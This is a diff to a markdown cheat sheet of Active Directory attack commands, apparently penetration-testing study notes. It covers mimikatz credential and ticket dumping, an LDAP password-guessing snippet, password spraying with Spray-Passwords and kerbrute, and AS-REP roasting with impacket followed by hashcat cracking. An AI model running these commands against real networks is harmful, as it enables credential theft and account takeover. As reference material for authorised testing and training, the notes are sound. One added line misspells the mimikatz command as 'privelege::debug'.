@@ -4,10 +4,12 @@
 
 https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
 
+With the `SeDebugPrivilege` privilege:
 ```
 PS > .\mimikatz.exe
+m $ privelege::debug
 m $ sekurlsa::logonpasswords
-PS2 > dir \\some\smb\share
+PS2 > dir \\some_other_host\smb\some_share # in another terminal
 m $ sekurlsa::tickets
 ```
 
@@ -15,27 +17,32 @@ m $ sekurlsa::tickets
 
 ### Passwords
 
-#### Principle
+#### Lockout
 
 Lockout threshold for password attacks:
 ```
 net accounts
 ```
 
-AD authentication:
+#### LDAP password attack using AD authentication - Principle
+
+LDAP query with user and password authentication:
 ```
+# Building the query
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 $pdc = ($domainObj.PdcRoleOwner).Name
 $searchString = "LDAP://"
 $searchString += $pdc + "/"
 $distinguishedName = "DC=$($domainObj.Name.Replace('.',',DC='))"
 $searchString += $distinguishedName
+
+# Authentication attack
 New-Object System.DirectoryServices.DirectoryEntry($searchString, "someuser", "somepass")
 ```
 
-#### Spray password attacks
+#### LDAP spray password attack - "Spray-passwords" script 
 
-Spray passwords: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
+Spray-passwords on GitHub: https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
 ```
 PS > powershell -ep bypass
 PS > .\Spray-Passwords.ps1 -Pass somepass -Admin
@@ -54,7 +61,9 @@ Warning: can lock users out
 
 #### Kerbrute
 
-Kerbrute on GitHub: https://github.com/ropnop/kerbrute
+Kerbrute on GitHub: 
+- https://github.com/ropnop/kerbrute
+- https://github.com/ropnop/kerbrute/releases
 
 ```
 PS > type userstohack.txt
@@ -67,7 +76,7 @@ PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.t
 
 Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
 ```
-$ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/someuser
+$ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/any_user
 $ hashcat --help | grep -i 'kerberos' # look for "AS-REP" in this case
 $ hashcat -m 18200 hashes_as-rep_to_roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
